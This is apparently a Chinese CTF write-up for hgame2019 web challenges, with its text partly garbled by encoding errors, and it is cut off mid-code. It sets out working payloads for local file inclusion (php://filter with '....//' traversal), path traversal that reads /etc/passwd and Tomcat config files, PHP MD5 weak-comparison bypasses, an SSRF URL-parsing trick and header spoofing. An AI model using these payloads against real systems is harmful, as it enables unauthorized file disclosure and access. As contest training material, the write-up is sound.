\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;damn...hgame2019 is coming soon, but the stupid Mki haven\u0026#39;t finished his web-challenge...\u0026lt;/p\u0026gt; Press ENTER or t\u0026lt;/br\u0026gt;ommand to continue \u0026lt;p\u0026gt;fine, nothing serious, just give you flag this time...\u0026lt;/p\u0026gt; \u0026lt;/br\u0026gt; \u0026lt;p\u0026gt;the flag is hgame{3eek_diScl0Sure_fRom+wEbsit@} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; æ¢å¤´å¤§ä½œæˆ˜  æƒ³è¦ flag å˜› å·¥å…·: burpsuite postman hackbar æ€ä¹ˆç”¨å»ç™¾åº¦ï¼Œç›¸ä¿¡ä½ å¯ä»¥çš„\n ä¸€æ­¥æ­¥æ”¹åŒ…å°±å¯ä»¥äº†ã€‚å®Œæ•´åŒ…å¦‚ä¸‹ï¼š\nPOST /week1/how/index.php HTTP/1.1 Host: 120.78.184.111:8080 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Waterfox/50.0 Referer: www.bilibili.com Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close X-Forwarded-For: 127.0.0.1 Cookie: admin=1 Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Type: application/x-www-form-urlencoded Content-Length: 14 want=%E6%83%B3 very easy web  ä»£ç å®¡è®¡åˆ â™‚ ä½“éªŒ\n \u0026lt;?php error_reporting(0); include(\u0026#34;flag.php\u0026#34;); if(strpos(\u0026#34;vidar\u0026#34;,$_GET[\u0026#39;id\u0026#39;])!==FALSE) die(\u0026#34;\u0026lt;p\u0026gt;å¹²å·´çˆ¹\u0026lt;/p\u0026gt;\u0026#34;); $_GET[\u0026#39;id\u0026#39;] = urldecode($_GET[\u0026#39;id\u0026#39;]); if($_GET[\u0026#39;id\u0026#39;] === \u0026#34;vidar\u0026#34;) { echo $flag; } highlight_file(__FILE__); ?\u0026gt;æºç å¦‚ä¸Šï¼Œæ¯”è¾ƒç®€å•ï¼ŒäºŒæ¬¡urlencodeå³å¯ï¼Œpayload: id=%2576%2569%2564%2561%2572\ncan u find me  ä¸ºä»€ä¹ˆä¸é—®é—®ç¥å¥‡çš„åäºŒå§‘å¨˜å’Œå¥¹çš„å°ä¼™ä¼´å‘¢\n æŸ¥çœ‹æºç å¾—åˆ°ä¸‹ä¸€å…³åœ°å€\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;can u find me?\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;the gate has been hidden\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;can you find it? xixixi\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;f12.php\u0026#34;\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; è·Ÿè¿›ï¼Œæç¤º\n\u0026lt;p\u0026gt;please post password to me! I will open the gate for you!\u0026lt;/p\u0026gt; æŸ¥çœ‹è¯¥åŒ…å¯ä»¥å‘ç°æœ‰å“åº”å¤´\nHTTP/1.1 200 OK Server: nginx/1.15.8 Date: Sat, 02 Feb 2019 10:32:42 GMT Content-Type: text/html; charset=UTF-8 Connection: close X-Powered-By: PHP/7.2.14 password: woyaoflag Content-Length: 302 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;can u find me?\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;yeah!you find the gate\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;but can you find the password?\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;please post password to me! I will open the gate for you!\u0026lt;/p\u0026gt; \u0026lt;/html\u0026gt; ä¼ å…¥å¯¹åº”çš„ password ä¹‹åï¼Œæç¤º\n\u0026lt;p\u0026gt;right!\u0026lt;/p\u0026gt;\u0026lt;a href=\u0026#39;iamflag.php\u0026#39;\u0026gt; click me to get flag\u0026lt;/a\u0026gt;\u0026lt;/body\u0026gt; æŠ“åŒ…è®¿é—®æ˜¯ä¸ª 302 è·³è½¬ï¼Œiamflag.php å°±å­˜åœ¨ flag\nHTTP/1.1 302 Found Server: nginx/1.15.8 Date: Sat, 02 Feb 2019 10:33:51 GMT Content-Type: text/html; charset=UTF-8 Connection: close X-Powered-By: PHP/7.2.14 location: toofast.php Content-Length: 132 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;can you find me?\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;flag:hgame{f12_1s_aMazIng111}\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Week 2 Web easy_php  ä»£ç å®¡è®¡ â™‚ ç¬¬äºŒå¼¹\n Title æç¤º where is my robots ï¼Œè®¿é—® robots.txt å¾—åˆ° img/index.php ï¼Œè®¿é—®å¾—åˆ°çœŸæºç \n\u0026lt;?php error_reporting(0); $img = $_GET[\u0026#39;img\u0026#39;]; if(!isset($img)) $img = \u0026#39;1\u0026#39;; $img = str_replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;, $img); include_once($img.\u0026#34;.php\u0026#34;); highlight_file(__FILE__); ä½¿ç”¨....//ç»•è¿‡../çš„è¿‡æ»¤ï¼Œä½¿ç”¨php://filter/read=convert.base64-encode/resource=æ¥è¯»å–æ–‡ä»¶å†…å®¹\næœ€ç»ˆ payload:php://filter/read=convert.base64-encode/resource=....//flag\nè§£ base64 å¾—åˆ°ï¼š\n\u0026lt;?php //$flag = \u0026#39;hgame{You_4re_So_g0od}\u0026#39;;  echo \u0026#34;maybe_you_should_think_think\u0026#34;; php trick  some php tricks\n \u0026lt;?php //admin.php highlight_file(__FILE__); $str1 = (string)@$_GET[\u0026#39;str1\u0026#39;]; $str2 = (string)@$_GET[\u0026#39;str2\u0026#39;]; $str3 = @$_GET[\u0026#39;str3\u0026#39;]; $str4 = @$_GET[\u0026#39;str4\u0026#39;]; $str5 = @$_GET[\u0026#39;H_game\u0026#39;]; $url = @$_GET[\u0026#39;url\u0026#39;]; if( $str1 == $str2 ){ die(\u0026#39;step 1 fail\u0026#39;); } if( md5($str1) != md5($str2) ){ die(\u0026#39;step 2 fail\u0026#39;); } if( $str3 == $str4 ){ die(\u0026#39;step 3 fail\u0026#39;); } if ( md5($str3) !== md5($str4)){ die(\u0026#39;step 4 fail\u0026#39;); } if (strpos($_SERVER[\u0026#39;QUERY_STRING\u0026#39;], \u0026#34;H_game\u0026#34;) !==false) { die(\u0026#39;step 5 fail\u0026#39;); } if(is_numeric($str5)){ die(\u0026#39;step 6 fail\u0026#39;); } if ($str5\u0026lt;9999999999){ die(\u0026#39;step 7 fail\u0026#39;); } if ((string)$str5\u0026gt;0){ die(\u0026#39;step 8 fial\u0026#39;); } if (parse_url($url, PHP_URL_HOST) !== \u0026#34;www.baidu.com\u0026#34;){ die(\u0026#39;step 9 fail\u0026#39;); } if (parse_url($url,PHP_URL_SCHEME) !== \u0026#34;http\u0026#34;){ die(\u0026#39;step 10 fail\u0026#39;); } $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); $output = curl_exec($ch); curl_close($ch); if($output === FALSE){ die(\u0026#39;step 11 fail\u0026#39;); } else{ echo $output; } ä½¿ç”¨str1=QNKCDZO\u0026amp;str2=240610708ç»•è¿‡step 1ä¸­çš„md5å¼±ç›¸ç­‰\nä½¿ç”¨æ•°ç»„ç»•è¿‡step 2ä¸­çš„md5ç›¸ç­‰\nä½¿ç”¨.ç»•è¿‡å¯¹_çš„åˆ¤æ–­ï¼Œæ•°ç»„ç»•è¿‡å¯¹æ•°å­—çš„åˆ¤æ–­\nä½¿ç”¨http://localhost@127.0.0.1:80@www.baidu.com/admin.phpç»•è¿‡step 9 10çš„åˆ¤æ–­ï¼Œå¾—åˆ°admin.php\n\u0026lt;?php //flag.php if($_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] != \u0026#39;127.0.0.1\u0026#39;) { die(\u0026#39;only localhost can see it\u0026#39;); } $filename = $_GET[\u0026#39;filename\u0026#39;]??\u0026#39;\u0026#39;; if (file_exists($filename)) { echo \u0026#34;sorry,you can\u0026#39;t see it\u0026#34;; } else{ echo file_get_contents($filename); } highlight_file(__FILE__); ?\u0026gt;ä½¿ç”¨filename=xxxxx/../flag.phpç»•è¿‡file_existsä¸file_get_contentså‡½æ•°\nå¾—åˆ°flag.php\n\u0026lt;?php $flag = hgame{ThEr4_Ar4_s0m4_Php_Tr1cks} ?\u0026gt;PHP Is The Best Language  var_dump äº†è§£ä¸€ä¸‹\n \u0026lt;?php include \u0026#39;secret.php\u0026#39;; #echo $flag; #echo $secret;  if (empty($_POST[\u0026#39;gate\u0026#39;]) || empty($_POST[\u0026#39;key\u0026#39;])) { highlight_file(__FILE__); exit; } if (isset($_POST[\u0026#39;door\u0026#39;])){ $secret = hash_hmac(\u0026#39;sha256\u0026#39;, $_POST[\u0026#39;door\u0026#39;], $secret); } $gate = hash_hmac(\u0026#39;sha256\u0026#39;, $_POST[\u0026#39;key\u0026#39;], $secret); if ($gate !== $_POST[\u0026#39;gate\u0026#39;]) { echo \u0026#34;Hacker GetOut!!\u0026#34;; exit; } if ((md5($_POST[\u0026#39;key\u0026#39;])+1) == (md5(md5($_POST[\u0026#39;key\u0026#39;])))+1) { echo \u0026#34;Wow!!!\u0026#34;; echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo $flag; } else { echo \u0026#34;Hacker GetOut!!\u0026#34;; } ?\u0026gt;ä¸€å¼€å§‹æˆ‘ä¸€ç›´åœ¨æƒ³ç”¨æ•°ç»„ç»•è¿‡å¯¹keyçš„md5åˆ¤æ–­ï¼Œå¯æ˜¯ä¸€æ—¦ç”¨äº†æ•°ç»„ï¼Œ$gateè®¡ç®—å‡ºæ¥çš„å°±æ˜¯NULLï¼Œå› ä¸ºhash_hmac('sha256', $_POST['key'], $secret);ä¸­key[]ä¸ºæ•°ç»„ï¼Œå°±ä¼šå‡ºç°è¿”å›NULLçš„æƒ…å†µï¼Œä½†æ˜¯è¿™æ ·çš„è¯ï¼Œ$gateå°±å› ä¸ºkey[]çš„åŸå› ç­‰äºNULLäº†ï¼Œè€Œéœ€è¦ç»•è¿‡$gate !== $_POST['gate']ï¼Œå°±éœ€è¦gateå‚æ•°ä¸å­˜åœ¨æˆ–è€…ä¸º 0ï¼Œç„¶åè¿™ä¸¤ç§æƒ…å†µéƒ½ç»•ä¸è¿‡ä¸€å¼€å§‹çš„empty($_POST['gate'])ï¼Œå› ä¸ºempty(NULL)ä¸empty(0)éƒ½æ˜¯true\u0026hellip;\nåæ¥ç»è¿‡ä¸€ç•ªæé†’ï¼Œ$_POST['key']æ˜¯å¯ä»¥çˆ†ç ´å¾—åˆ°çš„ï¼Œä¾‹å¦‚åœ¨ 100 å†…\nfor($i=1; $i \u0026lt; 99 ;$i++){ if ((md5($i)+1) == (md5(md5($i)))+1) { echo $i.\u0026#34;\\n\u0026#34;; } } 12 14 39 42 49 50 53 65 71 74 79 83 98 å¾—åˆ°è¿™ä¹ˆå¤šä¸ªæ•°\u0026hellip;\næ‰€ä»¥æ•´ä¸ªç¯èŠ‚å°±æ¯”è¾ƒæ¸…æ¥šäº†ï¼Œä½¿ç”¨door[]å°†$secretç½®æ¢ä¸ºNULLï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨æœ¬åœ°ç®—å‡º$gateçš„å€¼äº†ï¼Œç„¶å POST é‚£ä¸ªå€¼å°±è¡Œäº†ã€‚\næœ€ç»ˆç”¨door[]=1\u0026amp;key=98\u0026amp;gate=34047c350a9243401fb31a261407ca367fe058a8f7e00abd10b257e89025ccddå¾—åˆ° flag : hgame{Php_MayBe_Not_Safe}\nBaby_Spider  Come to death in the ocean of mathematics together with Li4n0! Answer 30 questions correctly in a row during 40 seconds(The calculation result is subject to python3),then you can get the flag. Enjoy it~\n**hint1:**The most basic operation of a spider is to disguise itself. **hint2:**Always believe only what you see with your own eyes\n è¿™é¢˜å¾ˆå‘å¾ˆå‘\u0026hellip;åšå¾—æœ‰ç‚¹ç”Ÿæ°”\né¦–å…ˆ 1-10 å…³éœ€è¦å¸¦ä¸€äº›æ™®é€šè¯·æ±‚å¤´è®¿é—®ï¼Œå¦åˆ™ç¬¬åå…³ä¼šç›´æ¥è¿”å›shutdownå‘½ä»¤ï¼Œæˆ‘æ²¡æœ‰ç”¨ç®¡ç†å‘˜ç›´æ¥è·‘ï¼Œæ‰€ä»¥æ²¡å…³æœºï¼Œä½†æ˜¯æˆ‘è¯¯ä»¥ä¸ºè¿™æ˜¯è¦æ±‚pythonè¿”å›å€¼çš„é—®é¢˜ï¼Œç„¶åæäº†åŠå¤©å‘ç°æ˜¯éœ€è¦å¸¦ä¸€äº›è¯·æ±‚å¤´\nç„¶ååœ¨ 11 å…³ä»–ä¼šä¿®æ”¹ä¸€ä¸ªå­—ä½“çš„ style ï¼Œæ¯”å¦‚æˆ‘å¾—åˆ°æ–‡æœ¬ä¸º(972279097)/414696815/(472238406)+769794962*(27940524)=?ï¼Œä½†æ˜¯è§†è§‰æ•ˆæœå´æ˜¯\n \nå­—ä½“ style ä¸º\n\u0026lt;style\u0026gt; @font-face { font-family: Ariali; src: url(\u0026#39;Ariali.otf\u0026#39;); font-weight: normal; font-style: normal; } .question-container{ font-family: Ariali; font-weight: bold; } å¯¹åº”è§„åˆ™ä¸º\n0123456789-\u0026gt;1026943587 21-30 å…³åˆæ”¹äº† style ï¼Œç»™question-containerå¢åŠ äº†afterå…ƒç´ \n\u0026lt;style\u0026gt; .question-container:after{ content:\u0026#34;(616887126)-957226796+956719004+554270862+732380290=?\u0026#34;; } æ‰€ä»¥æˆ‘ä»¬å°±éœ€è¦å»è®¡ç®—è¿™ä¸ª content ä¸­çš„å³å¯ã€‚\næŠŠè„šæœ¬ä¸­çš„ token æ›¿æ¢ä¸ºè‡ªå·±çš„ token :\nimport re import requests token_url = \u0026#39;http://111.231.140.29:10000/\u0026#39; solution_url = \u0026#39;http://111.231.140.29:10000/solution\u0026#39; style_url = \u0026#39;http://111.231.140.29:10000/statics/style.css\u0026#39; headers = { \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36\u0026#39;, } dic = \u0026#39;1026943587\u0026#39; r = requests.Session() s = r.post(token_url,data={\u0026#39;token\u0026#39;:\u0026#39;BkqnELak3XMzcYsXPZ0DFuXSRf9DLsRW\u0026#39;},allow_redirects=True,headers=headers) str_text = r\u0026#34;\u0026lt;div class=\\\u0026#34;question-container\\\u0026#34;\u0026gt;\u0026lt;span\u0026gt;.*\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt;\u0026#34; for i in range(1,11): print(str(i)) # if i == 11: # rep = r.get(style_url) # print(rep.text) match = re.search(str_text,s.text) result = match.group().replace(\u0026#34;\u0026lt;div class=\\\u0026#34;question-container\\\u0026#34;\u0026gt;\u0026lt;span\u0026gt;\u0026#34;,\u0026#34;\u0026#34;) result = result.replace(\u0026#34;=?\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt;\u0026#34;,\u0026#34;\u0026#34;) print(result + \u0026#39;\\n\u0026#39;) result = str(eval(result)) s = r.post(solution_url,data={\u0026#39;answer\u0026#39;:result},headers=headers) print(s.text) for i in range(11,21): print(str(i)) # if i == 21: # rep = r.get(style_url) # print(rep.text) match = re.search(str_text,s.text) result = match.group().replace(\u0026#34;\u0026lt;div class=\\\u0026#34;question-container\\\u0026#34;\u0026gt;\u0026lt;span\u0026gt;\u0026#34;,\u0026#34;\u0026#34;) result = result.replace(\u0026#34;=?\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt;\u0026#34;,\u0026#34;\u0026#34;) tmp = \u0026#39;\u0026#39; for j in range(0,len(result)): if ord(result[j]) \u0026gt; 47: tmp += dic[int(result[j])] else: tmp += result[j] result = tmp print(result + \u0026#39;\\n\u0026#39;) result = str(eval(result)) s = r.post(solution_url,data={\u0026#39;answer\u0026#39;:result},headers=headers) print(s.text) for i in range(21,31): print(str(i)) # if i == 21: # rep = r.get(style_url) # print(rep.text) s = r.get(style_url) match = re.search(\u0026#34;content:\\\u0026#34;.*=?\\\u0026#34;\u0026#34;,s.text) result = match.group().replace(\u0026#34;content:\\\u0026#34;\u0026#34;,\u0026#34;\u0026#34;) result = result.replace(\u0026#34;=?\\\u0026#34;\u0026#34;,\u0026#34;\u0026#34;) print(result + \u0026#39;\\n\u0026#39;) result = str(eval(result)) s = r.post(solution_url,data={\u0026#39;answer\u0026#39;:result},headers=headers) print(s.text) è™½ç„¶å‘å½’å‘ï¼Œä½†æ˜¯ä¹Ÿæ˜¯èƒ½ç†è§£ä½œè€…æƒ³è¡¨è¾¾çš„åçˆ¬è™«æŠ€æœ¯çš„æŠ€å·§çš„æƒ³æ³•çš„\nMath æœ‰è¶£  Math is interesting, isn\u0026rsquo;t it? update: é¢˜ä¸­æœ€åçš„^æ˜¯ä¹˜æ–¹ï¼Œä¸æ˜¯ xor hint: äº†è§£ä¸€ä¸‹ tomcatã€spring mvc çš„ç›®å½•ç»“æ„å’Œé…ç½®æ–‡ä»¶(è‡ªå·±æ­ä¸€ä¸‹å°±æ˜ç™½äº† hint2: å›¾ç‰‡ç›®å½•ä¸åœ¨ web ç›®å½•ä¸‹\n è¾“å…¥ç­”æ¡ˆ 2 ä¹‹åï¼Œè¿›å…¥ä¸‹ä¸€é¢˜ï¼Œå‘ç°æ˜¯ä¸ªè®¡ç®—\u0026hellip;\n \næˆ‘ç›´æ¥æ”¾åœ¨ä¸€æ—è·‘ 1-999ï¼Œç„¶åç»§ç»­çœ‹é¢˜ï¼ŒæŸ¥çœ‹æºç æˆ‘ä»¬å¯ä»¥å‘ç°\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Title\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;It seems that you have learned it, let us do a difficult question.\u0026lt;br/\u0026gt;\u0026lt;img src=/img/cXVlc3Rpb24ucG5n.php\u0026gt;\u0026lt;br/\u0026gt;Show me the smallest integer solutions.\u0026lt;/p\u0026gt; \u0026lt;br/\u0026gt; \u0026lt;form action=\u0026#34;/index.php\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; Your Answer: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;answer\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å›¾ç‰‡æ–‡ä»¶æœ‰äº›æ€ªå¼‚ï¼Œç«Ÿç„¶æ˜¯ä¸ª.phpåç¼€ï¼Œå°è¯•çœ‹çœ‹æ–‡ä»¶ï¼Œå‘ç°æŠ¥é”™\n \nçœ‹æ¥æ˜¯ä¸ªbase64åŠ å¯†çš„å›¾ç‰‡åå­—æ ¼å¼ï¼Œatob(\u0026quot;cXVlc3Rpb24ucG5n\u0026quot;)å¾—åˆ°question.png\nå°è¯•ç”¨/img/answer.png.phpè®¿é—®ï¼Œæ¢äº†ä¸€ç§æŠ¥é”™\n \nçŒœæµ‹æ˜¯ä¸ªå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œç„¶åæˆ‘ä»¬ç”¨../../../../../etc/passwdç»è¿‡ base64 ç¼–ç ååŠ ä¸Š.phpè®¿é—®ï¼ŒæˆåŠŸå¾—åˆ°æ–‡ä»¶å†…å®¹ï¼Œäºæ˜¯çŒœè§£ç›®å½•ç»“æ„ï¼Œå‘ç°ç»è¿‡../../ä¹‹åå°±æ˜¯æ ¹ç›®å½•ã€‚\né¢˜ç›®å¹¶æ²¡æœ‰ç»™ç‰¹åˆ«çš„ä¿¡æ¯ï¼ŒçŒœæµ‹æ˜¯ä¸ªé»˜è®¤ç›®å½•ä¹‹ç±»çš„ï¼Œæ—¢ç„¶æ”¾åœ¨tomcatä¸‹ï¼Œè€Œä¸”ä¹Ÿä¸ç»™å…¶ä»–åŒ…åï¼Œåº”è¯¥å°±æ˜¯ç±»ä¼¼$TOMCAT_HOME/webapps/ROOTè¿™æ ·çš„ç›®å½•ï¼Œç„¶ååŠ ä¸ŠWEB-INF/web.xmlè¿™ä¸ªæ¯”è¾ƒå¸¸ç”¨çš„é»˜è®¤æ–‡ä»¶æ¥ç¡®å®šä½ç½®ï¼Œæœ€ç»ˆåœ¨../../usr/local/tomcatå‘ç°tomcatç›®å½•\nbtoa(\u0026#34;../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml\u0026#34;) \u0026#34;Li4vLi4vdXNyL2xvY2FsL3RvbWNhdC93ZWJhcHBzL1JPT1QvV0VCLUlORi93ZWIueG1s\u0026#34; å¾—åˆ°æ–‡ä»¶å†…å®¹\n\u0026lt;!DOCTYPE web-app PUBLIC \u0026#34;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\u0026#34; \u0026#34;http://java.sun.com/dtd/web-app_2_3.dtd\u0026#34; \u0026gt; \u0026lt;web-app\u0026gt; \u0026lt;display-name\u0026gt;Archetype Created Web Application\u0026lt;/display-name\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;contextConfigLocation\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;classpath:application-context.xml\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;listener\u0026gt; \u0026lt;listener-class\u0026gt;org.springframework.web.context.ContextLoaderListener\u0026lt;/listener-class\u0026gt; \u0026lt;/listener\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;mathyouqu\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;org.springframework.web.servlet.DispatcherServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;mathyouqu\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;*.php\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; æ ¹æ®classpath:application-context.xmlï¼Œè®¿é—®WEB-INF/classes/application-context.xmlå¾—åˆ°æ–‡ä»¶å†…å®¹\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;beans xmlns=\u0026#34;http://www.springframework.org/schema/beans\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:context=\u0026#34;http://www.springframework.org/schema/context\u0026#34; xmlns:p=\u0026#34;http://www.springframework.org/schema/p\u0026#34; xsi:schemaLocation=\u0026#34;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\u0026#34;\u0026gt; \u0026lt;/beans\u0026gt; ä½†æ˜¯æ–‡ä»¶å†…å®¹å¯¹æˆ‘ä»¬æ¥ä¸‹æ¥è¦è¯»å–çš„æºç å¹¶æ²¡ä»€ä¹ˆå¸®åŠ©ï¼Œäºæ˜¯æ‰¾äº†å¾ˆå¤šå…¶ä»–çš„é…ç½®æ–‡ä»¶éƒ½æ²¡æœ‰æ‰¾åˆ°ï¼Œæœ€åæƒ³èµ·æ¥æŠ¥é”™é¡µé¢åº”è¯¥ä¼šæœ‰é¡¹ç›®æ–‡ä»¶çš„åå­—ï¼Œä¹Ÿå°±æ˜¯ä¹‹å‰çš„é‚£å¼ å›¾ï¼š\n \næˆ‘ä»¬å¯ä»¥çœ‹åˆ°åŒ…åhgame.controllerï¼Œç„¶åMathControllerå°±æ˜¯æ§åˆ¶å™¨ï¼Œå¯¹åº”çš„å°±æ˜¯.classæ–‡ä»¶ï¼Œimage()å¯¹åº”çš„å°±æ˜¯MathControllerè¿™ä¸ªç±»ä¸­çš„æ–¹æ³•ã€‚è¿™æ ·ä»åŒ…åæˆ‘ä»¬å°±å¯ä»¥æ‰¾åˆ°æ–‡ä»¶è·¯å¾„äº†ï¼ŒçŒœæµ‹å°±æ˜¯hgame/controller/MathController.classï¼Œå› ä¸ºæ˜¯ç¼–è¯‘å¥½çš„ï¼Œæ‰€ä»¥æ˜¯.classç»“å°¾ï¼Œè€Œä¸æ˜¯.java\nç”¨JD-GUIæ‰“å¼€å³å¯çœ‹åˆ°æºç ï¼š\npackage hgame.controller; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStream; import java.io.OutputStream; import java.io.PrintStream; import java.util.Base64; import java.util.Base64.Decoder; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import org.springframework.stereotype.Controller; import org.springframework.ui.ModelMap; import org.springframework.web.bind.annotation.PathVariable; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; @Controller public class MathController { @RequestMapping(value={\u0026#34;/index\u0026#34;}, method={org.springframework.web.bind.annotation.RequestMethod.GET}) public String index(ModelMap model, HttpSession session, HttpServletResponse response) throws IOException { Object step = session.getAttribute(\u0026#34;step\u0026#34;); if (step == null) { session.setAttribute(\u0026#34;step\u0026#34;, Character.valueOf(\u0026#39;1\u0026#39;)); response.sendRedirect(\u0026#34;/index.php\u0026#34;); return null; } if (step.toString().equals(\u0026#34;1\u0026#34;)) { model.addAttribute(\u0026#34;message\u0026#34;, \u0026#34;Welcome to the world of mathematics.\u0026lt;br/\u0026gt;Let\u0026#39;s warm up first.\u0026lt;br/\u0026gt;1+1=?\u0026#34;); } else if (step.toString().equals(\u0026#34;2\u0026#34;)) { model.addAttribute(\u0026#34;message\u0026#34;, \u0026#34;It seems that you have learned it, let us do a difficult question.\u0026lt;br/\u0026gt;\u0026lt;img src=/img/cXVlc3Rpb24ucG5n.php\u0026gt;\u0026lt;br/\u0026gt;Show me the smallest integer solutions.\u0026#34;); } return \u0026#34;math\u0026#34;; } @RequestMapping(value={\u0026#34;/index\u0026#34;}, method={org.springframework.web.bind.annotation.RequestMethod.POST}) public void pindex(@RequestParam(\u0026#34;answer\u0026#34;) String answer, HttpSession session, HttpServletResponse response) throws IOException { Object step = session.getAttribute(\u0026#34;step\u0026#34;); if (step == null) { session.setAttribute(\u0026#34;step\u0026#34;, Character.valueOf(\u0026#39;1\u0026#39;)); response.sendRedirect(\u0026#34;/index.php\u0026#34;); } else if ((step.toString().equals(\u0026#34;1\u0026#34;)) \u0026amp;\u0026amp; (answer.equals(\u0026#34;2\u0026#34;))) { session.setAttribute(\u0026#34;step\u0026#34;, \u0026#34;2\u0026#34;); response.sendRedirect(\u0026#34;/index.php\u0026#34;); } } @RequestMapping(value={\u0026#34;/img/{path}\u0026#34;}, method={org.springframework.web.bind.annotation.RequestMethod.GET}) public String image(@PathVariable(\u0026#34;path\u0026#34;) String path, HttpServletResponse response) { path = new String(Base64.getDecoder().decode(path)); InputStream f = null; OutputStream out = null; try { f = new FileInputStream(\u0026#34;/home/static/\u0026#34; + path); out = response.getOutputStream(); int count = 0; byte[] buffer = new byte[\u0026#39;ï¿½ï¿½ï¿½\u0026#39;]; while ((count = f.read(buffer)) != -1) { out.write(buffer, 0, count); out.flush(); } } catch (Exception e) { e.printStackTrace(); } try { f.close(); out.close(); } catch (Exception e) { e.printStackTrace(); } return \u0026#34;ok\u0026#34;; } @RequestMapping(value={\u0026#34;/flag\u0026#34;}, method={org.springframework.web.bind.annotation.RequestMethod.GET}) public String Flag(ModelMap model) { System.out.println(\u0026#34;This is the last question.\u0026#34;); System.out.println(\u0026#34;123852^x % 612799081 = 6181254136845 % 612799081\u0026#34;); System.out.println(\u0026#34;The flag is hgame{x}.x is a decimal number.\u0026#34;); model.addAttribute(\u0026#34;flag\u0026#34;, \u0026#34;Flag is not here.\u0026#34;); return \u0026#34;flag\u0026#34;; } } å¯ä»¥çœ‹åˆ°æœ‰ä¸ª/flagçš„è·¯ç”±ï¼Œæˆ‘ä»¬åªéœ€è¦è®¡ç®—123852^x % 612799081 = 6181254136845 % 612799081è¿™ä¸ªå°±å¯ä»¥äº†ï¼Œçˆ†ç ´å¾—åˆ°15387368å°±æ˜¯ç­”æ¡ˆ\nWeek 3 Web ç¥å¥‡çš„ md5  flag åœ¨æ ¹ç›®å½•ä¸‹(è¯·å–„å¾…å­¦ç”Ÿæœº) hint:md5 ç¢°æ’ ä½ è‡ªå·±æœ¬åœ°å»ç”Ÿæˆ 3 ä¸ª md5 å€¼ä¸€æ ·çš„ sha å€¼ä¸ä¸€æ ·çš„ ç”¨ curl ä¸Šä¼ \nhttp://118.25.89.91:8080/question/login.php\n è®¿é—®ä¸äº† 2333\nçœ‹å…¶ä»–å¸ˆå‚…çš„ wp ï¼Œé¦–å…ˆæ˜¯ä¸ªæºç å®¡è®¡\n\u0026lt;?php session_start(); error_reporting(0); if (@$_POST[\u0026#39;username\u0026#39;] and @$_POST[\u0026#39;password\u0026#39;] 